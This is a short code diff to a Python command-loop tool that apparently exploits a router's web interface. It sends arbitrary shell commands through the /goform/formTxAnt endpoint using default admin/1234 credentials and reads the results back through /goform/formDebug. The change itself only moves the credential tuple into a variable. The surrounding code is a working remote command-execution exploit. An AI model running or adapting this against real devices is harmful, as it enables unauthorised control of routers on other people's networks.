@@ -14,8 +14,9 @@ class cmd_loop(cmd.Cmd):
             print("[-] Command bigger than target buffer...")
             return
         cmd_dict = {"webCommand": command}
-        requests.post("http://192.168.2.1/goform/formTxAnt", auth=("admin", "1234"), data=cmd_dict)
-        output = requests.post("http://192.168.2.1/goform/formDebug", auth=("admin", "1234"), data={"password": "report.txt",
+        auth = ("admin", "1234")
+        requests.post("http://192.168.2.1/goform/formTxAnt", auth=auth, data=cmd_dict)
+        output = requests.post("http://192.168.2.1/goform/formDebug", auth=auth, data={"password": "report.txt",
                                                                             "save": "Save",
                                                                             "submit-url": "/debug.asp"}).content
         parsed_output = parse_output(output)
